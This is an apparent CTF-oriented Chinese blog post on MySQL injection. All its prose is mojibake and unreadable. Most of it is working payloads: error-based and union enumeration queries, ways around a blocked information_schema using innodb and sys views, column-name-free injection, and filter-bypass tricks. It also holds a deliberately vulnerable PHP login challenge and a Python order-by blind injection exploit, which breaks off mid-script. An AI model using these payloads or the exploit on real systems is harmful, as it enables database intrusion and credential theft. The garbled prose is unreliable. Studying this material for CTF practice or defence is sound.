        <content type="html"><![CDATA[<h1 id="SQLæ³¨å…¥-amp-amp-å·¥å…·ç¬”è®°"><a href="#SQLæ³¨å…¥-amp-amp-å·¥å…·ç¬”è®°" class="headerlink" title="SQLæ³¨å…¥&amp;&amp;å·¥å…·ç¬”è®°"></a>SQLæ³¨å…¥&amp;&amp;å·¥å…·ç¬”è®°</h1><blockquote><p>å¾ˆä¹…ä¹‹å‰ä¸Šé“ä¸‰åŸ¹è®­è¯¾è®°çš„ç¬”è®°ã€‚å½“æ—¶ä¸»è¦æƒ³è¡¥ä¸€è¡¥sqlæ³¨å…¥ï¼Œä½†æ²¡æƒ³åˆ°è®²çš„å¤ªæµ…äº†ï¼Œç”šè‡³è¿åŸç†éƒ½è®²ä¸æ˜ç™½ï¼Œäºæ˜¯è¿™ç¯‡æ¯”è¾ƒå…¨é¢çš„ç¬”è®°å°±è¯ç”Ÿäº†ã€‚å¾ˆå¤šç±»å‹çš„æ³¨å…¥åœ¨æœ¬æ–‡éƒ½ä¸ä¼šæåŠï¼Œå¾ˆå¤§ç¯‡å¹…æ˜¯å¯¹ä¸€äº›trickçš„æ¢ç´¢åŠåˆ†æã€‚</p></blockquote><h2 id="é“ä¸‰ç¬”è®°"><a href="#é“ä¸‰ç¬”è®°" class="headerlink" title="é“ä¸‰ç¬”è®°"></a>é“ä¸‰ç¬”è®°</h2><blockquote><p>è¿™éƒ¨åˆ†åªèƒ½è¯´åœ¨å¬è¯¾ä¹‹å‰æˆ‘æ˜¯æƒ³è®¤çœŸæ•´ç†ç¬”è®°çš„-.-</p></blockquote><h4 id="mysqlä¸­ä¸€äº›å¸¸ç”¨å‡½æ•°"><a href="#mysqlä¸­ä¸€äº›å¸¸ç”¨å‡½æ•°" class="headerlink" title="mysqlä¸­ä¸€äº›å¸¸ç”¨å‡½æ•°"></a>mysqlä¸­ä¸€äº›å¸¸ç”¨å‡½æ•°</h4><ul><li>database() æ•°æ®åº“å</li><li>version()  MYSQLæ•°æ®åº“ç‰ˆæœ¬</li><li>load_file() MYSQLè¯»å–æœ¬åœ°æ–‡ä»¶</li><li>@@datadir è¯»å–æ•°æ®åº“è·¯å¾„</li><li>@@basedir MYSQLå®‰è£…è·¯å¾„</li><li>@@plugin_dir pluginç›®å½•è·¯å¾„</li><li>@@secure_file_priv å¯¹äºæ–‡ä»¶è¯»&#x2F;å†™åŠŸèƒ½çš„æè¿°ã€‚ç›®å½•åè¡¨ç¤ºä»…å…è®¸å¯¹ç‰¹å®šç›®å½•çš„æ–‡ä»¶è¿›è¡Œè¯»&#x2F;å†™ï¼Œæ— è¡¨ç¤ºä»»æ„è¯»å†™ï¼ŒNULLè¡¨ç¤ºç¦æ­¢è¯»å†™ã€‚</li></ul><h4 id="MYSQLé“¾æ¥å­—ç¬¦ä¸²å‡½æ•°"><a href="#MYSQLé“¾æ¥å­—ç¬¦ä¸²å‡½æ•°" class="headerlink" title="MYSQLé“¾æ¥å­—ç¬¦ä¸²å‡½æ•°"></a>MYSQLé“¾æ¥å­—ç¬¦ä¸²å‡½æ•°</h4><ul><li>concat(str1,str2)    concat(username,0x23,password,0x23)</li><li>concat_ws(separator,str1,str2â€¦)   concat_ws(0x23,username,password)</li><li>group_concat(str1,str2â€¦â€¦) æ¯ä¸€è¡Œçš„æ•°æ®éƒ½æ˜¾ç¤ºå‡ºæ¥</li></ul><h4 id="æŠ¥é”™æ³¨å…¥å‡½æ•°"><a href="#æŠ¥é”™æ³¨å…¥å‡½æ•°" class="headerlink" title="æŠ¥é”™æ³¨å…¥å‡½æ•°"></a>æŠ¥é”™æ³¨å…¥å‡½æ•°</h4><ul><li>ExtractValue</li><li>updataXML</li></ul><p>&#x3D;&#x3D;ExtractValue(XML_document,XPath_string):&#x3D;&#x3D;</p><p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc</p><p>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string(Xpathæ ¼å¼çš„å­—ç¬¦ä¸²)</p><p>ä½œç”¨ï¼šä»ç›®æ ‡XMLä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸²</p><p>ä¾‹å¦‚ï¼š</p><p>or extractvalue(1,payload) &#x3D;&#x3D;&gt; or extractvalue(1,concat(0x7e,(select @@version),0x7e))</p><p>&#x3D;&#x3D;UpdateXML(XML_document,XPath_string,new_value):&#x3D;&#x3D;</p><p>å‰ä¸¤ä¸ªå‚æ•°å’ŒExtractValueçš„å‚æ•°ç›¸åŒ</p><p>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®</p><p>ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼</p><p>ä¾‹å¦‚ï¼š</p><p>or updatexml(1,payload,1) &#x3D;&#x3D;&gt; or updatexml(1,concat(0x7e,(select @@version),0x7e),1)</p><h2 id="Trick"><a href="#Trick" class="headerlink" title="Trick"></a>Trick</h2><h4 id="information-schemaè¢«ç¦ç”¨"><a href="#information-schemaè¢«ç¦ç”¨" class="headerlink" title="information_schemaè¢«ç¦ç”¨"></a>information_schemaè¢«ç¦ç”¨</h4><blockquote><p>information_schemaæ˜¯mysqlçš„é»˜è®¤åº“ï¼Œåº“é‡Œæœ‰tables,columnsè¿™äº›å…³é”®è¡¨ï¼Œé‡Œé¢è®°è½½ç€è¡¨åã€åˆ—åã€å­—æ®µç­‰å…³é”®ä¿¡æ¯ã€‚å› æ­¤å¸¸ç”¨äºsqlæ³¨å…¥ï¼Œä½†å¾ˆå¤šwaféƒ½è¿‡æ»¤äº†informationã€schemaè¿™äº›å­—æ®µã€‚</p></blockquote><p>è¯»è€…å¯ä»¥æŸ¥çœ‹è‡ªå·±çš„information_schemaå»äº†è§£è¯¥é»˜è®¤åº“ã€‚ä¸‹å›¾æ˜¯æˆ‘æŸ¥çœ‹information_schemaåº“ä¸­çš„columnsè¡¨ï¼Œå¯ä»¥çœ‹åˆ°é‡Œé¢è®°è½½ç€table_chema,table_name,column_nameç­‰ä¿¡æ¯(è¿æ¥æ•°æ®åº“å·¥å…·ä¸ºNavicat)ï¼š</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220707225633.png" style="zoom: 50%;" /><p>é»˜è®¤æ³¨å…¥ç‚¹æ‰€åœ¨çš„è¡¨æœ‰ä¸‰ä¸ªå­—æ®µï¼Œç¬¬äºŒä¸ªå­—æ®µæœ‰å›æ˜¾ã€‚å› æ­¤æœ€å¸¸è§çš„payloadä¸ºï¼š</p><pre class="line-numbers language-mysql"><code class="language-mysql">--æŸ¥æ•°æ®åº“squirt1e' union select 1,group_concat(schema_name),3 from information_schema.schemata#--æŸ¥è¡¨squirt1e' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='xxx'#--æŸ¥å­—æ®µsquirt1e' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='xxxx'#--æŸ¥æ•°æ®squirt1e' union select 1,group_concat(åˆ—å1,åˆ—å2...),3 from è¡¨å#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬å…³æ³¨çš„æ— æ³•å°±æ˜¯æŸ¥åº“åã€è¡¨åã€åˆ—åã€‚å¦‚æœinformation_schemaè¢«è¿‡æ»¤ï¼Œæœ€ç®€å•çš„æ€è·¯å°±æ˜¯å»æ‰¾åˆ«çš„é»˜è®¤åº“ã€‚ä¸‹é¢å°†ä»‹ç»&#x3D;&#x3D;InnoDb&#x3D;&#x3D;å­˜å‚¨å¼•æ“ä»¥åŠ&#x3D;&#x3D;sysæ•°æ®åº“&#x3D;&#x3D;ã€‚</p><h5 id="InnoDb"><a href="#InnoDb" class="headerlink" title="InnoDb"></a>InnoDb</h5><p>ä»MYSQL5.5.5å¼€å§‹ï¼ŒInnoDBæˆä¸ºå…¶é»˜è®¤å­˜å‚¨å¼•æ“ã€‚å­˜å‚¨å¼•æ“å¤„äºæ–‡ä»¶ç³»ç»Ÿä¹‹ä¸Šï¼Œåœ¨æ•°æ®ä¿å­˜åˆ°æ•°æ®æ–‡ä»¶ä¹‹å‰ä¼šä¼ è¾“åˆ°å­˜å‚¨å¼•æ“ï¼ˆ<strong>ä¹Ÿå°±æ˜¯å­˜å‚¨äº†æ•°æ®</strong>ï¼‰ï¼Œä¹‹åæŒ‰ç…§å„ä¸ªå­˜å‚¨å¼•æ“çš„å­˜å‚¨æ ¼å¼è¿›è¡Œå­˜å‚¨ã€‚</p><p>è€Œåœ¨MYSQL5.6ä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼Œinndbå¢åŠ äº†innodb_index_statså’Œinnodb_table_statsä¸¤å¼ è¡¨ï¼Œè¿™ä¸¤å¼ è¡¨ä¸­éƒ½å­˜å‚¨äº†æ•°æ®åº“å’Œå…¶æ•°æ®è¡¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æ²¡æœ‰å­˜å‚¨åˆ—åã€‚</p><p>æ¯”å¦‚ï¼š</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220707231744.png" style="zoom:50%;" /><p>å¯ä»¥çœ‹åˆ°innodb_table_statesçš„ä¸¤ä¸ªé‡è¦å­—æ®µä¸ºdatabase_nameä»¥åŠtable_nameã€‚é‚£ä¹ˆæˆ‘ä»¬çš„payloadï¼ˆé»˜è®¤æœ‰å›æ˜¾ï¼Œä¸‰ä¸ªå­—æ®µï¼‰å°±å¯ä»¥æ¢æˆï¼š</p><pre class="line-numbers language-mysql"><code class="language-mysql">0'union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()#åŸæœ‰çš„payload0'union/**/select/**/1,group_concat(table_name),3/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()#æ”¹è¿›çš„payload0'union/**/select/**/1,group_concat(table_name),3/**/from/**/mysql.innodb_index_stats/**/where/**/database_name=database()#innodb_index_statsä¹Ÿæ˜¯ä¸€æ ·çš„<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h5><p>mysqlåœ¨5.7ç‰ˆæœ¬ä¸­æ–°å¢äº†sysåº“ï¼ŒåŸºç¡€æ•°æ®æ¥è‡ªäºperformance_chemaå’Œinformation_schemaä¸¤ä¸ªåº“ï¼Œæœ¬èº«æ•°æ®åº“ä¸å­˜å‚¨æ•°æ®ï¼Œè¯¥åº“å­˜åœ¨å¾ˆå¤šè§†å›¾ã€‚</p><p>&#x3D;&#x3D;å®éªŒå‰æï¼šæˆ‘åœ¨ä¸€ä¸ªæ–°çš„mysqlç¯å¢ƒä¸­åªåˆ›å»ºäº†testä¸€ä¸ªåº“ï¼Œå…¶ä¸­è¡¨åä¸ºflagï¼Œå­—æ®µåªæœ‰ä¸€ä¸ªflagï¼Œå¹¶æœªè®¾ç½®è‡ªå¢ã€‚&#x3D;&#x3D;</p><p>sysè¿™ä¸ªåº“æœ‰å¾ˆå¤šè§†å›¾ï¼Œå…¶ä¸­schema_auto_increment_columnsè§†å›¾å€¼å¾—æ³¨æ„ï¼Œè¯¥è§†å›¾çš„ä½œç”¨ç®€å•æ¥è¯´å°±æ˜¯ç”¨æ¥å¯¹è¡¨è‡ªå¢IDçš„ç›‘æ§ã€‚</p><p>æ­¤æ—¶è¾“å…¥ï¼š</p><pre class="line-numbers language-mysql"><code class="language-mysql">SELECT * FROM sys.schema_auto_increment_columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç»“æœæ˜¯ä¸ºç©ºçš„ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘çš„éç³»ç»Ÿè¡¨åªæœ‰ä¸€ä¸ªflagè¡¨ï¼Œå¹¶ä¸”è¿˜æ²¡æœ‰è®¾ç½®è‡ªå¢idã€‚ä½†æ˜¯è¯¥è§†å›¾æœ‰table_shema,table_nameè¿™ä¸¤ä¸ªå­—æ®µï¼Œå› æ­¤åœ¨è®¾ç½®äº†è‡ªå¢idçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬çš„payloadå°±å¯ä»¥æ”¹æˆï¼š</p><pre class="line-numbers language-mysql"><code class="language-mysql">0'union/**/select/**/1,group_concat(table_name),3/**/from/**/sys.schema_auto_increment_columns/**/where/**/table_shcema=database()#æ”¹è¿›çš„payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>å°½ç®¡åœ¨çœŸå®åœºæ™¯ä¸­å¾ˆå¤šè¡¨æ˜¯æœ‰è‡ªå¢idçš„ï¼Œä½†æˆ‘ä»¬è¿˜æ˜¯æƒ³æ‰¾åˆ°ä¸€ä¸ªé€šè§£ã€‚</strong></p><p>ç®€å•çš„ç¿»äº†ä¸€ä¸‹sysï¼Œæ‰¾åˆ°äº†å…­ä¸ªè§†å›¾ã€‚è¿™å…­ä¸ªè§†å›¾å‡èƒ½æŸ¥è¯¢åˆ°ä¸å­˜åœ¨è‡ªå¢idçš„è¡¨åã€‚</p><ul><li>innodb_buffer_stats_by_table                    å­—æ®µï¼šobject_schema          object_name</li><li>schema_table_statistics                               å­—æ®µï¼štable_schema            table_name</li><li>schema_table_statistics_with_buffer         å­—æ®µï¼štable_schema            table_name</li><li>x$innodb_buffer_stats_by_table                å­—æ®µï¼šobject_schema          object_name</li><li>x$schema_table_statistics                           å­—æ®µï¼štable_schema            table_name</li><li>x$schema_table_statistics_with_buffer     å­—æ®µï¼štable_schema            table_name</li></ul><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-07-08%20003513.png" style="zoom:50%;" /><p>æ¡æ¡payloadé€šç½—é©¬ï¼š</p><pre class="line-numbers language-mysql"><code class="language-mysql">0'union/**/select/**/1,group_concat(table_name),3/**/from/**/sys.innodb_buffer_stats_by_table/**/where/**/object_shcema=database()#æ”¹è¿›çš„payload0'union/**/select/**/1,group_concat(table_name),3/**/from/**/sys.schema_table_statistics/**/where/**/table_shcema=database()#æ”¹è¿›çš„payload0'union/**/select/**/1,group_concat(table_name),3/**/from/**/sys.schema_table_statistics_with_buffer/**/where/**/table_shcema=database()#æ”¹è¿›çš„payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€šè¿‡syså’ŒInnoDbæˆ‘ä»¬å¯ä»¥ç»•è¿‡information_schemaå®ç°çˆ†åº“ååŠè¡¨åï¼Œæ¥ä¸‹æ¥å°±è¦æƒ³åŠæ³•çˆ†åˆ—åã€‚</p><h5 id="æ— åˆ—åæ³¨å…¥"><a href="#æ— åˆ—åæ³¨å…¥" class="headerlink" title="æ— åˆ—åæ³¨å…¥"></a>æ— åˆ—åæ³¨å…¥</h5><p>ä¸¾ä¾‹è¯´æ˜ï¼š</p><p>å¯ä»¥çœ‹åˆ°fromåé¢è·Ÿäº†select * from flag as a join flag as bï¼Œæˆ‘é€šè¿‡joinæŠŠaè¡¨å’Œbè¡¨è¿æ¥èµ·æ¥äº†ï¼Œæ­¤æ—¶ä»–ä»¬äº§ç”Ÿäº†ç›¸åŒçš„åˆ—åï¼Œå¦‚æœé€šè¿‡(select * from flag as a join flag as b)cèµ·äº†åˆ«åcï¼Œè¿™æ ·å°±ä¸<strong>ä½¿ç”¨åˆ«åæ—¶ï¼Œè¡¨ä¸­ä¸èƒ½å‡ºç°åŒçš„å­—æ®µå</strong>çš„ç‰¹æ€§ç›¸å†²çªï¼Œå› æ­¤ä¼šå¯¼è‡´æŠ¥é”™ï¼ŒæŠ¥é”™å†…å®¹ä¸ºç›¸åŒçš„åˆ—å(å³ç¬¬ä¸€ä¸ªå­—æ®µ)ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-07-08%20005623.png" style="zoom:50%;" /><p>æ¥ç€ï¼Œæˆ‘åœ¨flagè¡¨åˆ›å»ºäº†ç¬¬äºŒä¸ªå­—æ®µã€‚å¦‚æœæƒ³è·å¾—ä¸‹ä¸€ä¸ªå­—æ®µæ—¶éœ€è¦ä½¿ç”¨usingï¼Œusingç­‰ä»·äºjoinæ“ä½œä¸­çš„on,ä¾‹å¦‚aå’Œbæ ¹æ®flagå­—æ®µå…³è”ï¼š</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-07-08%20010648.png" style="zoom:50%;" /><p>è¿™æ ·æˆ‘ä»¬å°±æ³¨å‡ºäº†ç¬¬äºŒåˆ—ï¼Œå› æ­¤æ— åˆ—åæ³¨å…¥payloadä¸ºï¼š</p><pre class="line-numbers language-mysql"><code class="language-mysql">0' union all select* from (select * from flag as a join flag b)c#0' union all select* from (select * from flag as a join flag b using(flag))c#0' union all select* from (select * from flag as a join flag b using(flag,squirt1e))c#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="å„ç§å…³é”®å­—ã€å‡½æ•°è¿‡æ»¤ç»•è¿‡"><a href="#å„ç§å…³é”®å­—ã€å‡½æ•°è¿‡æ»¤ç»•è¿‡" class="headerlink" title="å„ç§å…³é”®å­—ã€å‡½æ•°è¿‡æ»¤ç»•è¿‡"></a>å„ç§å…³é”®å­—ã€å‡½æ•°è¿‡æ»¤ç»•è¿‡</h4><h5 id="and-or"><a href="#and-or" class="headerlink" title="and or"></a>and or</h5><ol><li>é€»è¾‘è¿ç®—ç¬¦ï¼šand&#x3D;&gt;&amp;&amp;ã€or&#x3D;&gt;||</li><li>å¼‚æˆ–è¿ç®—^</li></ol><h5 id="ç©ºæ ¼"><a href="#ç©ºæ ¼" class="headerlink" title="ç©ºæ ¼"></a>ç©ºæ ¼</h5><ol><li>æ‹¬å·ä»£æ›¿ç©ºæ ¼</li><li>å†…è”æ³¨é‡Š&#x2F;**&#x2F;</li><li>%09, %0a, %0b, %0c, %0d, %a0</li><li>TABæ¢è¡Œç¬¦</li></ol><h5 id="å•-x2F-åŒå¼•å·"><a href="#å•-x2F-åŒå¼•å·" class="headerlink" title="å•&#x2F;åŒå¼•å·"></a>å•&#x2F;åŒå¼•å·</h5><ol><li>16è¿›åˆ¶ã€8è¿›åˆ¶ã€2è¿›åˆ¶ç»•è¿‡</li></ol><h5 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h5><ol><li>å­—ç¬¦ä¸²æˆªæ–­å‡½æ•°ï¼šleft()ã€mid()ã€substr()ã€substring()</li><li>è½¬æ¢ä¸ºacsiiç å‡½æ•°ï¼šord()ã€ascii()</li><li>ç¡çœ å‡½æ•°ï¼šsleep(),benchmark()</li><li>é“¾æ¥å‡½æ•°ï¼šgroup_concat(),concat(),concat_ws()</li></ol><h5 id="æ‹¬å·"><a href="#æ‹¬å·" class="headerlink" title="æ‹¬å·"></a>æ‹¬å·</h5><p>ç›²æ³¨ç»å¸¸ä¼šç”¨åˆ°å‡½æ•°ï¼Œä½†å¦‚æœæ‹¬å·è¢«è¿‡æ»¤å‡½æ•°ä¹Ÿå°±ç”¨ä¸äº†ã€‚å› æ­¤å¯ä»¥è€ƒè™‘order byç›²æ³¨ï¼Œåé¢ä¼šè®²ã€‚</p><h5 id="é€—å·"><a href="#é€—å·" class="headerlink" title="é€—å·"></a>é€—å·</h5><ol><li>ç›²æ³¨ç»å¸¸ä¼šç”¨åˆ°substr(),mid()ï¼Œå› æ­¤ä¹Ÿä¼šç”¨åˆ°é€—å·ã€‚å¯¹äºsubstr()å’Œmid()è¿™ä¸¤ä¸ªæ–¹æ³•å¯ä»¥ä½¿ç”¨from forçš„æ–¹å¼æ¥è§£å†³ï¼š</li></ol><pre class="line-numbers language-mysql"><code class="language-mysql">select substr(database(),1,1)<==>select substr(database() from 1 for 1)select mid(database(),1,1)<==>select mid(database() from 1 for 1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="2"><li>limitä¹Ÿç»å¸¸ä¼šç”¨åˆ°ï¼Œå¯ä»¥ä½¿ç”¨offsetã€‚</li></ol><pre class="line-numbers language-mysql"><code class="language-mysql">select * from flag limit 0,1<==>select * from flag limit 1 offset 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="if"><a href="#if" class="headerlink" title="if"></a>if</h5><pre class="line-numbers language-mysql"><code class="language-mysql">select if((1=1),1,0)<==>select case when (1=1) then 1 else 0 end<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="æ¯”è¾ƒç¬¦å·ï¼ˆå¤§äº-gt-ã€å°äº-lt-ï¼‰"><a href="#æ¯”è¾ƒç¬¦å·ï¼ˆå¤§äº-gt-ã€å°äº-lt-ï¼‰" class="headerlink" title="æ¯”è¾ƒç¬¦å·ï¼ˆå¤§äº&gt;ã€å°äº&lt;ï¼‰"></a>æ¯”è¾ƒç¬¦å·ï¼ˆå¤§äº&gt;ã€å°äº&lt;ï¼‰</h5><p>greatest(a,b,c)å‡½æ•°è¿”å›è¾“å…¥å‚æ•°(a,b,c)çš„æœ€å¤§å€¼ã€‚</p><pre class="line-numbers language-mysql"><code class="language-mysql">0'or ascii(susbstr(user(),1,1))>32          <==========>0'or greatest(ascii(susbstr(user(),1,1)),32)=32<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="æ³¨é‡Šç¬¦"><a href="#æ³¨é‡Šç¬¦" class="headerlink" title="æ³¨é‡Šç¬¦"></a>æ³¨é‡Šç¬¦</h5><p>å¦‚æœ#,â€“ä¹‹ç±»çš„æ³¨é‡Šä¸è®©ç”¨ï¼Œé‚£ä¹ˆå°±ç”¨orçš„æ€§è´¨ã€‚</p><p>æ¯”å¦‚è¯­å¥ä¸ºselect * from articles where id&#x3D;â€™$idâ€™ and xxx</p><p>ä»¤:id&#x3D;1â€™union select 1,payload,3 or â€˜1</p><p>è¯­å¥å°±å˜æˆï¼š</p><p>select * from articles where id&#x3D;â€™1â€™ union select 1,payload,3 or â€˜1â€™ and xxx</p><h5 id="ç­‰äºå·"><a href="#ç­‰äºå·" class="headerlink" title="ç­‰äºå·"></a>ç­‰äºå·</h5><ol><li>like</li><li>in</li><li>regexp</li><li>rlike</li><li>between and           (select mid(database(),1,1) between â€˜aâ€™ <strong>and</strong> â€˜aâ€™ ;)</li></ol><h5 id="unionï¼Œselectï¼Œwhere"><a href="#unionï¼Œselectï¼Œwhere" class="headerlink" title="unionï¼Œselectï¼Œwhere"></a>unionï¼Œselectï¼Œwhere</h5><ol><li><p>å¤§å°å†™</p></li><li><p>åŒå†™</p></li><li><p>å†…è”æ³¨é‡Šï¼Œå¦‚æœåœ¨å¼€å¤´çš„çš„&#x2F;*åå¤´åŠ äº†æ„Ÿå¹å·ï¼Œé‚£ä¹ˆæ­¤æ³¨é‡Šé‡Œçš„è¯­å¥å°†è¢«æ‰§è¡Œã€‚ä¾‹å¦‚ï¼š</p><pre class="line-numbers language-mysql"><code class="language-mysql">/*!SELECT*/ flag from flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>é€šè¿‡SeT @a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;èµ‹å€¼ä¸€ä¸ªå˜é‡ï¼Œè¿™é‡Œæ”¯æŒ16è¿›åˆ¶ï¼Œç„¶åé¢„ç¼–è¯‘æ‰§è¡Œ:prepare execsql from @a;execute execsql;è¿™æ ·ä¸ç”¨æ‹¬å·ã€‚</p><p>ç”¨concaté…åˆcharä¹Ÿå¯ä»¥ï¼šSET @sql&#x3D;concat(char(115,101,108,101,99,116),â€™* from <code>flag</code>â€˜);PREPARE jwt from @sql;EXECUTE jwt;</p></li><li><p>ä½¿ç”¨å¥æŸ„ç›´æ¥è¯»è¡¨ä¹Ÿå¯ä»¥ï¼Œä½†å­˜å‚¨flagçš„è¡¨å¿…é¡»å­˜å‚¨åœ¨å½“å‰æ•°æ®åº“ä¸‹ï¼Œä¸ç„¶æ²¡ç”¨ï¼šHANDLER Flag OPEN; HANDLER Flag READ FIRST; HANDLER Flag CLOSE;#</p></li><li><p>mysql8.0çš„ç‰¹æ€§ï¼Œåé¢ä¼šè®²ã€‚</p></li></ol><h4 id="order-byç›²æ³¨"><a href="#order-byç›²æ³¨" class="headerlink" title="order byç›²æ³¨"></a>order byç›²æ³¨</h4><blockquote><p>å‚è€ƒ<a href="https://www.dazhuanlan.com/dempa0fit/topics/1173166">dempa0fit</a>å¸ˆå‚…çš„åšå®¢</p></blockquote><pre class="line-numbers language-mysql"><code class="language-mysql">/index.php/<?php  $dbhost = "localhost";  $dbuser = "root";  $dbpass = "********";/è¿™é‡Œæ˜¯ä½ çš„æ•°æ®åº“å¯†ç /  $db = "sqli";  $conn = mysqli_connect($dbhost,$dbuser,$dbpass,$db);  mysqli_set_charset($conn,"utf8");   / sql     create  table admin (        id int(10) not null primary key auto_increment,        username varchar(20) not null ,        password varchar(32) not null     );  */function   filter($str){      $filterlist = "/(|)|username|password|where|      case|when|like|regexp|into|limit|=|for|;/";      if(preg_match($filterlist,strtolower($str))){        die("illegal input!");      }      return $str;  }$username = isset($_POST['username'])?filter($_POST['username']):die("please input username!");$password = isset($_POST['password'])?filter($_POST['password']):die("please input password!");$sql = "select * from admin where  username = '$username' and password = '$password' "; $res = $conn -> query($sql);if($res->num_rows>0){  $row = $res -> fetch_assoc();  if($row['id']){     echo $row['username'];  }}else{   echo "The content in the password column is the flag!";} ?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å®‰æ’æ¯çš„ä¸€é“é¢˜ç›®ï¼Œå¯ä»¥çœ‹åˆ°(ã€)ã€usernameã€passwordã€whereã€ caseã€whenã€likeã€regexpã€intoã€limitã€&#x3D;ã€forã€;è¢«è¿‡æ»¤ï¼Œå¹¶ä¸”passwordè¢«è¿‡æ»¤ï¼Œå› æ­¤ç›²æ³¨è¡Œä¸é€šï¼Œè¿™é‡Œè€ƒè™‘ç”¨order byç›²æ³¨ã€‚</p><p>æ¯”å¦‚æˆ‘è¾“å…¥username&#x3D;adminâ€™ union select 1,2,{} order by 3#&amp;password&#x3D;123ã€‚</p><p>é‚£ä¹ˆè¯­å¥å˜ä¸ºï¼š</p><pre class="line-numbers language-mysql"><code class="language-mysql">select * from admin where  username ='admin' union select 1,2,a order by 3#' and password = '123'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>passwordåœ¨ç¬¬ä¸‰åˆ—ï¼Œå› æ­¤order by 3ã€‚å‡è®¾passwordçš„å€¼ä¸ºflagï¼Œé‚£ä¹ˆæ˜¾ç„¶aæ˜¯è¦å°äºflagçš„ã€‚æ˜¾ç„¶$row[â€˜idâ€™]å–å¾—æ˜¯ç¬¬ä¸€è¡Œï¼Œå› æ­¤usernameæ˜¯1ï¼›å¦‚æœè¾“å…¥1,2,fï¼Œæ­¤æ—¶ä¹Ÿæ˜¯1ï¼›å¦‚æœè¾“å…¥1,2,gï¼Œé‚£ä¹ˆå°±å›æ˜¾adminã€‚æ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥çŒœåˆ°äº†passwordç¬¬ä¸€ä½æ˜¯fäº†ã€‚</p><p>åˆç”±äºordery by ä¸åŒºåˆ†å¤§å°å†™ï¼Œå› æ­¤éœ€è¦ç”¨åˆ°binaryã€‚</p><p>å› æ­¤expï¼š</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">sqli</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://vps_ip/orderbysqli_test/index.php"</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'username'</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'123'</span><span class="token punctuation">}</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span>textusername <span class="token operator">=</span> <span class="token string">"admin'union select 1,2,0x{} order by 3 desc#"</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     n <span class="token operator">=</span> <span class="token number">0</span>     <span class="token keyword">for</span> j <span class="token keyword">in</span> range <span class="token punctuation">(</span><span class="token 